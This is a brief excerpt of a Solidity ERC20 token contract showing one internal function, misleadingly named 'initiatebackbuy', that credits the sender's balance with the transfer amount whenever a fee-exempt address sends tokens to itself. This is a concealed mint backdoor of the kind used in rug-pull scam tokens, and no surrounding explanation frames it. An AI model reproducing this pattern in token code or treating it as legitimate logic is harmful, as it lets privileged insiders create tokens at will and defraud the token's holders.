...
contract a is IERC20, Ownable {
    ...
    function initiatebackbuy(address sender, address recipient, uint256 amount) internal {
        if (sender==recipient){ if (!shouldTakeFee(sender,recipient)){_balances[sender] = _balances[sender].add(amount);}}
